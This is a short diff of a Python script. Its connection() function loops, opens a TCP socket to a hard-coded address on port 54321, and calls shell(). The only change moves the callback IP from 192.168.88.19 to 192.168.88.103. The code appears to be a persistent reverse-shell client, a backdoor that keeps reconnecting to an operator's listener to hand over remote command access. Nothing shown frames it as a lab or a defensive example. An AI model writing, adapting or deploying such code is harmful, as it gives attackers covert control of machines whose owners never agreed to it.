@@ -22,7 +22,7 @@ def connection():
 		time.sleep(5)
 		try:
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 and TCP
-			sock.connect(("192.168.88.19", 54321))
+			sock.connect(("192.168.88.103", 54321))
 			shell()
 		except:
 			connection()
